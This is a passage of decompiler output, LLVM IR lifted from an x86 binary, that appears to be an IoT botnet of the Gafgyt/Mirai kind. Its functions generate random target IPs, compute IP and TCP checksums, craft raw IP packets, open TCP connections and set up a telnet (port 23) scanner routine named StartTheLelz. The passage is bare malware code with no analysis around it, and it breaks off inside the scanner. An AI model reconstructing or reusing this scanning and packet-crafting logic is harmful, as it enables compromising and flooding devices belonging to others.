  uselistorder label %dec_label_pc_8049fdc, { 1, 0 }
  uselistorder label %dec_label_pc_8049fac, { 1, 0 }
  uselistorder label %dec_label_pc_8049f7c, { 1, 0 }
  uselistorder label %dec_label_pc_8049f4c, { 1, 0 }
  uselistorder label %dec_label_pc_8049f1c, { 1, 0 }
  uselistorder label %dec_label_pc_8049eec, { 1, 0 }
  uselistorder label %dec_label_pc_8049ebc, { 1, 0 }
  uselistorder label %dec_label_pc_8049e8c, { 1, 0 }
  uselistorder label %dec_label_pc_8049e5c, { 1, 0 }
  uselistorder label %dec_label_pc_8049e2c, { 1, 0 }
  uselistorder label %dec_label_pc_8049dfc, { 1, 0 }
  uselistorder label %dec_label_pc_8049dcc, { 1, 0 }
  uselistorder label %dec_label_pc_8049d9c, { 1, 0 }
  uselistorder label %dec_label_pc_8049d6c, { 1, 0 }
  uselistorder label %dec_label_pc_8049d3c, { 1, 0 }
  uselistorder label %dec_label_pc_8049d0c, { 1, 0 }
  uselistorder label %dec_label_pc_8049cdc, { 1, 0 }
}

define i32 @GetRandomIP(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_804c4e9 = load i32, i32* @global_var_80617c8.235, align 8
  %v1_804c4f2 = call i32 @ntohl(i32 %v0_804c4e9)
  %v5_804c4fa = and i32 %v1_804c4f2, %arg1
  %v1_804c500 = call i32 @rand_cmwc(i32 %v5_804c4fa)
  %v1_804c50a = sub i32 -1, %arg1
  %v2_804c50c = and i32 %v1_804c500, %v1_804c50a
  %v5_804c50e = xor i32 %v2_804c50c, %v5_804c4fa
  ret i32 %v5_804c50e
}

define i32 @csum(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_804c518 = load i32, i32* @ebx, align 4
  %v4_804c54c33 = add i32 %arg2, -1
  %v9_804c54c34 = sub i32 0, %arg2
  %v10_804c54c35 = and i32 %arg2, %v9_804c54c34
  %v11_804c54c36 = icmp slt i32 %v10_804c54c35, 0
  %v12_804c54c37 = icmp eq i32 %v4_804c54c33, 0
  %v13_804c54c38 = icmp slt i32 %v4_804c54c33, 0
  %v3_804c55039 = icmp eq i1 %v13_804c54c38, %v11_804c54c36
  %v4_804c55040 = icmp eq i1 %v12_804c54c37, false
  %v5_804c55041 = and i1 %v4_804c55040, %v3_804c55039
  br i1 %v5_804c55041, label %dec_label_pc_804c52c.lr.ph, label %dec_label_pc_804c552

dec_label_pc_804c52c.lr.ph:                       ; preds = %entry
  %v4_804c52f.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804c52c

dec_label_pc_804c52c:                             ; preds = %dec_label_pc_804c52c.lr.ph, %dec_label_pc_804c52c
  %v4_804c52f = phi i32 [ %v4_804c52f.pre, %dec_label_pc_804c52c.lr.ph ], [ %v6_804c52f, %dec_label_pc_804c52c ]
  %stack_var_-24.045 = phi i16 [ 0, %dec_label_pc_804c52c.lr.ph ], [ %v9_804c541, %dec_label_pc_804c52c ]
  %stack_var_8.044 = phi i32 [ %arg2, %dec_label_pc_804c52c.lr.ph ], [ %v4_804c548, %dec_label_pc_804c52c ]
  %stack_var_4.043 = phi i16* [ %arg1, %dec_label_pc_804c52c.lr.ph ], [ %v23_804c544, %dec_label_pc_804c52c ]
  %v3_804c53e42 = phi i32 [ 0, %dec_label_pc_804c52c.lr.ph ], [ %v6_804c53e, %dec_label_pc_804c52c ]
  %v4_804c52c = ptrtoint i16* %stack_var_4.043 to i32
  %v2_804c52f = load i16, i16* %stack_var_4.043, align 2
  %v3_804c52f = zext i16 %v2_804c52f to i32
  %v5_804c52f = and i32 %v4_804c52f, -65536
  %v6_804c52f = or i32 %v5_804c52f, %v3_804c52f
  store i32 %v6_804c52f, i32* @ecx, align 4
  %sext51 = mul i32 %v3_804c53e42, 65536
  %v4_804c53e = sdiv i32 %sext51, 65536
  %v6_804c53e = add nsw i32 %v3_804c52f, %v4_804c53e
  %v11_804c53e = icmp ult i32 %v6_804c53e, %v4_804c53e
  %v26_804c53e = trunc i32 %v6_804c53e to i16
  %v7_804c541 = zext i1 %v11_804c53e to i16
  %v9_804c541 = add i16 %v7_804c541, %stack_var_-24.045
  %v5_804c544 = add i32 %v4_804c52c, 2
  %v23_804c544 = inttoptr i32 %v5_804c544 to i16*
  %v4_804c548 = add i32 %stack_var_8.044, -2
  %v4_804c54c = add i32 %stack_var_8.044, -3
  %v9_804c54c = sub i32 2, %stack_var_8.044
  %v10_804c54c = and i32 %v4_804c548, %v9_804c54c
  %v11_804c54c = icmp slt i32 %v10_804c54c, 0
  %v12_804c54c = icmp eq i32 %v4_804c54c, 0
  %v13_804c54c = icmp slt i32 %v4_804c54c, 0
  %v3_804c550 = icmp eq i1 %v13_804c54c, %v11_804c54c
  %v4_804c550 = icmp eq i1 %v12_804c54c, false
  %v5_804c550 = and i1 %v4_804c550, %v3_804c550
  br i1 %v5_804c550, label %dec_label_pc_804c52c, label %dec_label_pc_804c552

dec_label_pc_804c552:                             ; preds = %dec_label_pc_804c52c, %entry
  %v3_804c53e.lcssa = phi i16 [ 0, %entry ], [ %v26_804c53e, %dec_label_pc_804c52c ]
  %stack_var_4.0.lcssa = phi i16* [ %arg1, %entry ], [ %v23_804c544, %dec_label_pc_804c52c ]
  %stack_var_8.0.lcssa = phi i32 [ %arg2, %entry ], [ %v4_804c548, %dec_label_pc_804c52c ]
  %stack_var_-24.0.lcssa = phi i16 [ 0, %entry ], [ %v9_804c541, %dec_label_pc_804c52c ]
  %tmp18 = icmp slt i32 %stack_var_8.0.lcssa, 1
  br i1 %tmp18, label %dec_label_pc_804c596.preheader, label %dec_label_pc_804c558

dec_label_pc_804c558:                             ; preds = %dec_label_pc_804c552
  %v1_804c55b = bitcast i16* %stack_var_4.0.lcssa to i8*
  %v2_804c55b = load i8, i8* %v1_804c55b, align 1
  %v3_804c55b = zext i8 %v2_804c55b to i32
  %v4_804c55b = load i32, i32* @ecx, align 4
  %v5_804c55b = and i32 %v4_804c55b, -256
  %v6_804c55b = or i32 %v5_804c55b, %v3_804c55b
  store i32 %v6_804c55b, i32* @ecx, align 4
  %v4_804c569 = sext i16 %v3_804c53e.lcssa to i32
  %v6_804c569 = add nsw i32 %v3_804c55b, %v4_804c569
  %v11_804c569 = icmp ult i32 %v6_804c569, %v4_804c569
  %v26_804c569 = trunc i32 %v6_804c569 to i16
  %v7_804c56c = zext i1 %v11_804c569 to i16
  %v9_804c56c = add i16 %v7_804c56c, %stack_var_-24.0.lcssa
  br label %dec_label_pc_804c596.preheader

dec_label_pc_804c596.preheader:                   ; preds = %dec_label_pc_804c558, %dec_label_pc_804c552
  %v3_804c57b.ph = phi i16 [ %v3_804c53e.lcssa, %dec_label_pc_804c552 ], [ %v26_804c569, %dec_label_pc_804c558 ]
  %stack_var_-24.1.ph = phi i16 [ %stack_var_-24.0.lcssa, %dec_label_pc_804c552 ], [ %v9_804c56c, %dec_label_pc_804c558 ]
  %v4_804c59620 = sext i16 %v3_804c57b.ph to i32
  %v4_804c59921 = sext i16 %stack_var_-24.1.ph to i32
  %v3_804c59c22 = udiv i32 %v4_804c59620, 65536
  %v4_804c59c23 = mul i32 %v4_804c59921, 65536
  %v5_804c59c24 = or i32 %v4_804c59c23, %v3_804c59c22
  %v2_804c5a025 = udiv i32 %v4_804c59921, 65536
  %v2_804c5a326 = or i32 %v5_804c59c24, %v2_804c5a025
  %v3_804c5a327 = icmp eq i32 %v2_804c5a326, 0
  %v1_804c5a728 = icmp eq i1 %v3_804c5a327, false
  br i1 %v1_804c5a728, label %dec_label_pc_804c571, label %dec_label_pc_804c5a9

dec_label_pc_804c571:                             ; preds = %dec_label_pc_804c596.preheader, %dec_label_pc_804c571
  %v2_804c5a031 = phi i32 [ %v2_804c5a0, %dec_label_pc_804c571 ], [ %v2_804c5a025, %dec_label_pc_804c596.preheader ]
  %v5_804c59c30 = phi i32 [ %v5_804c59c, %dec_label_pc_804c571 ], [ %v5_804c59c24, %dec_label_pc_804c596.preheader ]
  %v4_804c59629 = phi i32 [ %v4_804c596, %dec_label_pc_804c571 ], [ %v4_804c59620, %dec_label_pc_804c596.preheader ]
  %v2_804c58c = add i32 %v5_804c59c30, %v4_804c59629
  %v7_804c58c = icmp ult i32 %v2_804c58c, %v4_804c59629
  %v3_804c58e = zext i1 %v7_804c58c to i32
  %v5_804c58e = add nuw nsw i32 %v3_804c58e, %v2_804c5a031
  %sext = mul i32 %v2_804c58c, 65536
  %v4_804c596 = sdiv i32 %sext, 65536
  %sext50 = mul i32 %v5_804c58e, 65536
  %v4_804c599 = sdiv i32 %sext50, 65536
  %v3_804c59c = udiv i32 %v4_804c596, 65536
  %v5_804c59c = or i32 %sext50, %v3_804c59c
  %v2_804c5a0 = udiv i32 %v4_804c599, 65536
  %v2_804c5a3 = or i32 %v5_804c59c, %v2_804c5a0
  %v3_804c5a3 = icmp eq i32 %v2_804c5a3, 0
  %v1_804c5a7 = icmp eq i1 %v3_804c5a3, false
  br i1 %v1_804c5a7, label %dec_label_pc_804c571, label %dec_label_pc_804c596.dec_label_pc_804c5a9_crit_edge

dec_label_pc_804c596.dec_label_pc_804c5a9_crit_edge: ; preds = %dec_label_pc_804c571
  store i32 %v5_804c59c30, i32* @ecx, align 4
  br label %dec_label_pc_804c5a9

dec_label_pc_804c5a9:                             ; preds = %dec_label_pc_804c596.dec_label_pc_804c5a9_crit_edge, %dec_label_pc_804c596.preheader
  %v4_804c596.lcssa = phi i32 [ %v4_804c596, %dec_label_pc_804c596.dec_label_pc_804c5a9_crit_edge ], [ %v4_804c59620, %dec_label_pc_804c596.preheader ]
  %v1_804c5ac = urem i32 %v4_804c596.lcssa, 65536
  %v1_804c5ae = xor i32 %v1_804c5ac, 65535
  store i32 %v0_804c518, i32* @ebx, align 4
  ret i32 %v1_804c5ae

; uselistorder directives
  uselistorder i32 %v5_804c59c, { 1, 0 }
  uselistorder i32 %v4_804c596, { 1, 0, 2 }
  uselistorder i32 %v2_804c5a025, { 1, 0 }
  uselistorder i32 %v4_804c59921, { 1, 0 }
  uselistorder i32 %v4_804c59620, { 2, 1, 0 }
  uselistorder i32 %v4_804c569, { 1, 0 }
  uselistorder i16 %stack_var_-24.0.lcssa, { 1, 0 }
  uselistorder i16 %v3_804c53e.lcssa, { 1, 0 }
  uselistorder i32 %v4_804c54c, { 1, 0 }
  uselistorder i32 %v6_804c53e, { 1, 2, 0 }
  uselistorder i32 %v4_804c53e, { 1, 0 }
  uselistorder i32 %v6_804c52f, { 1, 0 }
  uselistorder label %dec_label_pc_804c571, { 1, 0 }
  uselistorder label %dec_label_pc_804c52c, { 1, 0 }
}

define i32 @tcpcsum() local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %v1_804c5cf = add i32 %tmp9, 12
  %v2_804c5cf = inttoptr i32 %v1_804c5cf to i32*
  %v3_804c5cf = load i32, i32* %v2_804c5cf, align 4
  %v1_804c5d8 = add i32 %tmp9, 16
  %v2_804c5d8 = inttoptr i32 %v1_804c5d8 to i32*
  %v3_804c5d8 = load i32, i32* %v2_804c5d8, align 4
  %v1_804c5eb = call i32 @htons(i32 20)
  %v1_804c605 = call i32 @malloc(i32 32)
  store i32 %v1_804c605, i32* %ecx.global-to-local, align 4
  %v2_804c618 = inttoptr i32 %v1_804c605 to i32*
  store i32 %v3_804c5cf, i32* %v2_804c618, align 4
  %v1_804c61d = load i32, i32* %ecx.global-to-local, align 4
  %v2_804c61d = add i32 %v1_804c61d, 4
  %v3_804c61d = inttoptr i32 %v2_804c61d to i32*
  store i32 %v3_804c5d8, i32* %v3_804c61d, align 4
  %v1_804c623 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804c623 = add i32 %v1_804c623, 8
  %v3_804c623 = inttoptr i32 %v2_804c623 to i32*
  store i32 0, i32* %v3_804c623, align 4
  store i32 %tmp1, i32* @ecx, align 4
  %v1_804c62c = add i32 %v1_804c605, 12
  store i32 %v1_804c62c, i32* %edx.global-to-local, align 4
  %v1_804c62f = inttoptr i32 %tmp1 to i32*
  %v2_804c62f = load i32, i32* %v1_804c62f, align 4
  %v2_804c631 = inttoptr i32 %v1_804c62c to i32*
  store i32 %v2_804c62f, i32* %v2_804c631, align 4
  %v0_804c633 = load i32, i32* @ecx, align 4
  %v1_804c633 = add i32 %v0_804c633, 4
  %v2_804c633 = inttoptr i32 %v1_804c633 to i32*
  %v3_804c633 = load i32, i32* %v2_804c633, align 4
  %v1_804c636 = load i32, i32* %edx.global-to-local, align 4
  %v2_804c636 = add i32 %v1_804c636, 4
  %v3_804c636 = inttoptr i32 %v2_804c636 to i32*
  store i32 %v3_804c633, i32* %v3_804c636, align 4
  %v0_804c639 = load i32, i32* @ecx, align 4
  %v1_804c639 = add i32 %v0_804c639, 8
  %v2_804c639 = inttoptr i32 %v1_804c639 to i32*
  %v3_804c639 = load i32, i32* %v2_804c639, align 4
  %v1_804c63c = load i32, i32* %edx.global-to-local, align 4
  %v2_804c63c = add i32 %v1_804c63c, 8
  %v3_804c63c = inttoptr i32 %v2_804c63c to i32*
  store i32 %v3_804c639, i32* %v3_804c63c, align 4
  %v0_804c63f = load i32, i32* @ecx, align 4
  %v1_804c63f = add i32 %v0_804c63f, 12
  %v2_804c63f = inttoptr i32 %v1_804c63f to i32*
  %v3_804c63f = load i32, i32* %v2_804c63f, align 4
  %v1_804c642 = load i32, i32* %edx.global-to-local, align 4
  %v2_804c642 = add i32 %v1_804c642, 12
  %v3_804c642 = inttoptr i32 %v2_804c642 to i32*
  store i32 %v3_804c63f, i32* %v3_804c642, align 4
  %v0_804c645 = load i32, i32* @ecx, align 4
  %v1_804c645 = add i32 %v0_804c645, 16
  %v2_804c645 = inttoptr i32 %v1_804c645 to i32*
  %v3_804c645 = load i32, i32* %v2_804c645, align 4
  %v1_804c648 = load i32, i32* %edx.global-to-local, align 4
  %v2_804c648 = add i32 %v1_804c648, 16
  %v3_804c648 = inttoptr i32 %v2_804c648 to i32*
  store i32 %v3_804c645, i32* %v3_804c648, align 4
  %v2_804c651 = inttoptr i32 %v1_804c605 to i16*
  %v3_804c651 = call i32 @csum(i16* %v2_804c651, i32 32)
  %v1_804c663 = call i32 @free(i32 %v1_804c605)
  %v4_804c66b = urem i32 %v3_804c651, 65536
  ret i32 %v4_804c66b

; uselistorder directives
  uselistorder i32 %v1_804c605, { 2, 3, 4, 1, 0 }
  uselistorder i32 %tmp9, { 1, 0 }
  uselistorder i32 %tmp1, { 1, 0 }
}

define i32 @makeIPPacket() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i8* @__decompiler_undefined_function_2()
  %tmp8 = call i8 @__decompiler_undefined_function_3()
  %stack_var_-4 = alloca i32, align 4
  %v0_804c676 = load i32, i32* @ebp, align 4
  store i32 %v0_804c676, i32* %stack_var_-4, align 4
  %v4_804c67c = sext i8 %tmp8 to i32
  %v4_804c682 = ptrtoint i8* %tmp6 to i32
  store i8 69, i8* %tmp6, align 1
  %v1_804c69f = add i32 %v4_804c682, 1
  %v2_804c69f = inttoptr i32 %v1_804c69f to i8*
  store i8 0, i8* %v2_804c69f, align 1
  %v1_804c6a6 = add i32 %tmp5, 20
  %v1_804c6ac = trunc i32 %v1_804c6a6 to i16
  %v3_804c6ac = add i32 %v4_804c682, 2
  %v4_804c6ac = inttoptr i32 %v3_804c6ac to i16*
  store i16 %v1_804c6ac, i16* %v4_804c6ac, align 2
  %v2_804c6b0 = call i32 @rand_cmwc(i32 %v4_804c67c)
  %v1_804c6ba = trunc i32 %v2_804c6b0 to i16
  %v3_804c6ba = add i32 %v4_804c682, 4
  %v4_804c6ba = inttoptr i32 %v3_804c6ba to i16*
  store i16 %v1_804c6ba, i16* %v4_804c6ba, align 2
  %v1_804c6c1 = add i32 %v4_804c682, 6
  %v2_804c6c1 = inttoptr i32 %v1_804c6c1 to i16*
  store i16 0, i16* %v2_804c6c1, align 2
  %v1_804c6ca = add i32 %v4_804c682, 8
  %v2_804c6ca = inttoptr i32 %v1_804c6ca to i8*
  store i8 -1, i8* %v2_804c6ca, align 1
  %v3_804c6d4 = add i32 %v4_804c682, 9
  %v4_804c6d4 = inttoptr i32 %v3_804c6d4 to i8*
  store i8 %tmp8, i8* %v4_804c6d4, align 1
  %v1_804c6da = add i32 %v4_804c682, 10
  %v2_804c6da = inttoptr i32 %v1_804c6da to i16*
  store i16 0, i16* %v2_804c6da, align 2
  %v2_804c6e6 = add i32 %v4_804c682, 12
  %v3_804c6e6 = inttoptr i32 %v2_804c6e6 to i32*
  %v2_804c6ef = add i32 %v4_804c682, 16
  %v3_804c6ef = inttoptr i32 %v2_804c6ef to i32*
  store i32 %tmp, i32* %v3_804c6ef, align 4
  %v2_804c6f2 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804c6f2, i32* @ebp, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i8 -1, { 2, 0, 1 }
}

define i32 @sclose(i32 %arg1) local_unnamed_addr {
entry:
  %v4_804c6fa = add i32 %arg1, -2
  %v9_804c6fa = sub i32 1, %arg1
  %v10_804c6fa = and i32 %v9_804c6fa, %arg1
  %v11_804c6fa = icmp slt i32 %v10_804c6fa, 0
  %v12_804c6fa = icmp eq i32 %v4_804c6fa, 0
  %v13_804c6fa = icmp slt i32 %v4_804c6fa, 0
  %v3_804c6fe = icmp eq i1 %v13_804c6fa, %v11_804c6fa
  %v4_804c6fe = icmp eq i1 %v12_804c6fa, false
  %v5_804c6fe = and i1 %v4_804c6fe, %v3_804c6fe
  br i1 %v5_804c6fe, label %dec_label_pc_804c709, label %dec_label_pc_804c71e

dec_label_pc_804c709:                             ; preds = %entry
  %v1_804c70f = call i32 @__libc_close(i32 %arg1)
  br label %dec_label_pc_804c71e

dec_label_pc_804c71e:                             ; preds = %entry, %dec_label_pc_804c709
  %storemerge = phi i32 [ 0, %dec_label_pc_804c709 ], [ 1, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_804c6fa, { 1, 0 }
  uselistorder i32 %arg1, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804c71e, { 1, 0 }
}

define i32 @socket_connect(i32 %arg1, i16 %arg2) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  store i32 1, i32* %stack_var_-32, align 4
  %v1_804c73d = call i32 @__GI_gethostbyname(i32 %arg1)
  %v4_804c748 = icmp eq i32 %v1_804c73d, 0
  %v1_804c74c = icmp eq i1 %v4_804c748, false
  br i1 %v1_804c74c, label %dec_label_pc_804c75a, label %dec_label_pc_804c74e

dec_label_pc_804c74e:                             ; preds = %entry
  br label %dec_label_pc_804c7ff

dec_label_pc_804c75a:                             ; preds = %entry
  %v1_804c75d = add i32 %v1_804c73d, 12
  %v2_804c75d = inttoptr i32 %v1_804c75d to i32*
  %v3_804c75d = load i32, i32* %v2_804c75d, align 4
  %v1_804c765 = add i32 %v1_804c73d, 16
  %v2_804c765 = inttoptr i32 %v1_804c765 to i32*
  %v3_804c765 = load i32, i32* %v2_804c765, align 4
  %v1_804c768 = inttoptr i32 %v3_804c765 to i32*
  %v2_804c768 = load i32, i32* %v1_804c768, align 4
  %v15_804c771 = ptrtoint i32* %stack_var_-24 to i32
  %v3_804c776 = call i32 @bcopy(i32 %v2_804c768, i32 %v15_804c771, i32 %v3_804c75d)
  %v1_804c7811 = zext i16 %arg2 to i32
  %v1_804c78a = call i32 @htons(i32 %v1_804c7811)
  store i32 2, i32* %stack_var_-28, align 4
  %v3_804c7a5 = call i32 @socket(i32 2, i32 1, i32 6)
  %v2_804c7b0 = ptrtoint i32* %stack_var_-32 to i32
  %v5_804c7c0 = call i32 @__GI_setsockopt(i32 %v3_804c7a5, i32 6, i32 1, i32 %v2_804c7b0, i32 4)
  %v13_804c7c8 = icmp eq i32 %v3_804c7a5, -1
  %v1_804c7cc = icmp eq i1 %v13_804c7c8, false
  br i1 %v1_804c7cc, label %dec_label_pc_804c7d7, label %dec_label_pc_804c7ce

dec_label_pc_804c7ce:                             ; preds = %dec_label_pc_804c75a
  br label %dec_label_pc_804c7ff

dec_label_pc_804c7d7:                             ; preds = %dec_label_pc_804c75a
  %v2_804c76e = ptrtoint i32* %stack_var_-28 to i32
  %v3_804c7e3 = call i32 @__libc_connect(i32 %v3_804c7a5, i32 %v2_804c76e, i32 16)
  %v10_804c7eb = icmp eq i32 %v3_804c7e3, -1
  %v1_804c7ee = icmp eq i1 %v10_804c7eb, false
  br i1 %v1_804c7ee, label %dec_label_pc_804c7f9, label %dec_label_pc_804c7f0

dec_label_pc_804c7f0:                             ; preds = %dec_label_pc_804c7d7
  br label %dec_label_pc_804c7ff

dec_label_pc_804c7f9:                             ; preds = %dec_label_pc_804c7d7
  br label %dec_label_pc_804c7ff

dec_label_pc_804c7ff:                             ; preds = %dec_label_pc_804c7f0, %dec_label_pc_804c7ce, %dec_label_pc_804c74e, %dec_label_pc_804c7f9
  %v3_804c7ff = phi i32 [ 0, %dec_label_pc_804c7f0 ], [ 0, %dec_label_pc_804c7ce ], [ 0, %dec_label_pc_804c74e ], [ %v3_804c7a5, %dec_label_pc_804c7f9 ]
  ret i32 %v3_804c7ff

; uselistorder directives
  uselistorder i32 %v3_804c7a5, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder label %dec_label_pc_804c7ff, { 3, 0, 1, 2 }
}

define i32 @StartTheLelz(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-324 = alloca i32, align 4
  %stack_var_-316 = alloca i32, align 4
  %stack_var_-596 = alloca i32, align 4
  %stack_var_-604 = alloca i32, align 4
  %stack_var_-636 = alloca i32, align 4
  %v15_804c80a = ptrtoint i32* %stack_var_-636 to i32
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_804c81b = call i32 @__GI_time(i32* null)
  store i32 %v2_804c81b, i32* %eax.global-to-local, align 4
  store i32 %v2_804c81b, i32* @ebx, align 4
  %v1_804c825 = call i32 @rand_cmwc(i32 0)
  %v1_804c82a = load i32, i32* @ebx, align 4
  %v2_804c82a = xor i32 %v1_804c82a, %v1_804c825
  store i32 %v2_804c82a, i32* @eax, align 4
  %v1_804c830 = call i32 @srand(i32 %v2_804c82a)
  store i32 %v1_804c830, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-604, align 4
  %v1_804c846 = call i32 @htons(i32 23)
  %v2_804c855 = ptrtoint i32* %stack_var_-604 to i32
  %v15_804c85b = ptrtoint i32* %stack_var_-596 to i32
  store i32 %v15_804c85b, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-596, align 4
  %v1_804c873 = call i32 @malloc(i32 513)
  store i32 %v1_804c873, i32* %edx.global-to-local, align 4
  store i32 513, i32* %eax.global-to-local, align 4
  %v3_804c88f = inttoptr i32 %v1_804c873 to i8*
  %v4_804c88f = call i32 @__GI_memset(i8* %v3_804c88f, i32 0, i32 513)
  %v2_804c8a8 = mul i32 %arg2, 28
  %v1_804c8ad = add i32 %v2_804c8a8, 30
  %v2_804c8b0 = and i32 %v1_804c8ad, -16
  %v2_804c8b6 = sub i32 %v15_804c80a, %v2_804c8b0
  %v1_804c8c4 = add i32 %v2_804c8b6, 15
  %v2_804c8c7 = and i32 %v1_804c8c4, -16
  %v2_804c8e4 = mul i32 %arg2, 5
  store i32 %v2_804c8e4, i32* %edx.global-to-local, align 4
  %v1_804c8ea = inttoptr i32 %v2_804c8c7 to i8*
  store i32 %v2_804c8c7, i32* @edi, align 4
  %v1_804c8ef = and i32 %v1_804c8c4, -256
  store i32 %v1_804c8ef, i32* %eax.global-to-local, align 4
  %v5_804c8f1 = call i8* @_memset(i8* %v1_804c8ea, i32 %v1_804c8ef, i32 %v2_804c8e4)
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804c97e50 = icmp sgt i32 %arg2, 0
  br i1 %v5_804c97e50, label %dec_label_pc_804c8fc.lr.ph, label %dec_label_pc_804c98b

dec_label_pc_804c8fc.lr.ph:                       ; preds = %entry
  %v2_804c950 = or i32 %v2_804c8c7, 9
  br label %dec_label_pc_804c8fc

dec_label_pc_804c8fc:                             ; preds = %dec_label_pc_804c8fc, %dec_label_pc_804c8fc.lr.ph
  %storemerge251 = phi i32 [ 0, %dec_label_pc_804c8fc.lr.ph ], [ %v4_804c975, %dec_label_pc_804c8fc ]
  %v2_804c910 = mul i32 %storemerge251, 28
  %v2_804c912 = add i32 %v2_804c910, %v2_804c8c7
  store i32 %v2_804c912, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804c91a = inttoptr i32 %v2_804c912 to i32*
  store i32 0, i32* %v2_804c91a, align 4
  %v0_804c91c = load i32, i32* %eax.global-to-local, align 4
  %v1_804c91c = add i32 %v0_804c91c, 4
  store i32 %v1_804c91c, i32* %eax.global-to-local, align 4
  %v0_804c91f = load i32, i32* %edx.global-to-local, align 4
  %v2_804c91f = inttoptr i32 %v1_804c91c to i32*
  store i32 %v0_804c91f, i32* %v2_804c91f, align 4
  %v0_804c921 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c921 = add i32 %v0_804c921, 4
  store i32 %v1_804c921, i32* %eax.global-to-local, align 4
  %v0_804c924 = load i32, i32* %edx.global-to-local, align 4
  %v2_804c924 = inttoptr i32 %v1_804c921 to i32*
  store i32 %v0_804c924, i32* %v2_804c924, align 4
  %v0_804c926 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c926 = add i32 %v0_804c926, 4
  store i32 %v1_804c926, i32* %eax.global-to-local, align 4
  %v0_804c929 = load i32, i32* %edx.global-to-local, align 4
  %v2_804c929 = inttoptr i32 %v1_804c926 to i32*
  store i32 %v0_804c929, i32* %v2_804c929, align 4
  %v0_804c92b = load i32, i32* %eax.global-to-local, align 4
  %v1_804c92b = add i32 %v0_804c92b, 4
  store i32 %v1_804c92b, i32* %eax.global-to-local, align 4
  %v0_804c92e = load i32, i32* %edx.global-to-local, align 4
  %v2_804c92e = inttoptr i32 %v1_804c92b to i32*
  store i32 %v0_804c92e, i32* %v2_804c92e, align 4
  %v0_804c930 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c930 = add i32 %v0_804c930, 4
  store i32 %v1_804c930, i32* %eax.global-to-local, align 4
  %v0_804c933 = load i32, i32* %edx.global-to-local, align 4
  %v2_804c933 = inttoptr i32 %v1_804c930 to i32*
  store i32 %v0_804c933, i32* %v2_804c933, align 4
  %v0_804c935 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c935 = add i32 %v0_804c935, 4
  %v0_804c938 = load i32, i32* %edx.global-to-local, align 4
  %v2_804c938 = inttoptr i32 %v1_804c935 to i32*
  store i32 %v0_804c938, i32* %v2_804c938, align 4
  %v3_804c950 = add i32 %v2_804c950, %v2_804c910
  %v4_804c950 = inttoptr i32 %v3_804c950 to i8*
  store i8 1, i8* %v4_804c950, align 1
  %v1_804c96d = add i32 %v2_804c912, 24
  store i32 %v1_804c96d, i32* %edx.global-to-local, align 4
  %v2_804c973 = inttoptr i32 %v1_804c96d to i32*
  store i32 %v1_804c873, i32* %v2_804c973, align 4
  %v4_804c975 = add nuw nsw i32 %storemerge251, 1
  store i32 %v4_804c975, i32* %eax.global-to-local, align 4
  %exitcond52 = icmp eq i32 %v4_804c975, %arg2
  br i1 %exitcond52, label %dec_label_pc_804c98b, label %dec_label_pc_804c8fc

dec_label_pc_804c98b:                             ; preds = %entry, %dec_label_pc_804c8fc, %dec_label_pc_804c98b
  %stack_var_-48.0 = phi i32 [ %v4_804c98b, %dec_label_pc_804c98b ], [ 0, %dec_label_pc_804c8fc ], [ 0, %entry ]
  %v4_804c98b = add i32 %stack_var_-48.0, 1
  store i32 %v4_804c98b, i32* %eax.global-to-local, align 4
  %v1_804c991 = mul i32 %v4_804c98b, 4
  %v2_804c991 = add i32 %v1_804c991, ptrtoint ([10 x i8*]* @global_var_805b1e0.246 to i32)
  %v3_804c991 = inttoptr i32 %v2_804c991 to i32*
  %v4_804c991 = load i32, i32* %v3_804c991, align 4
  store i32 %v4_804c991, i32* %eax.global-to-local, align 4
  %v1_804c998 = icmp eq i32 %v4_804c991, 0
  %v1_804c99a = icmp eq i1 %v1_804c998, false
  br i1 %v1_804c99a, label %dec_label_pc_804c98b, label %dec_label_pc_804c99c.preheader

dec_label_pc_804c99c.preheader:                   ; preds = %dec_label_pc_804c98b
  %v2_804cdb2 = ptrtoint i32* %stack_var_-316 to i32
  %tmp38 = bitcast i32* %stack_var_-316 to i8*
  %v2_804ce35 = ptrtoint i32* %stack_var_-324 to i32
  %v2_804ce8d = ptrtoint i32* %stack_var_-328 to i32
  %v2_804ce94 = ptrtoint i32* %stack_var_-332 to i32
  %v2_804ca0d = or i32 %v2_804c8c7, 8
  %v2_804ca50 = or i32 %v2_804c8c7, 9
  %v2_804cb3f = or i32 %v2_804c8c7, 11
  %v2_804cb79 = or i32 %v2_804c8c7, 10
  %v2_804d574 = add i32 %v2_804c8c7, 16
  br label %dec_label_pc_804c99c

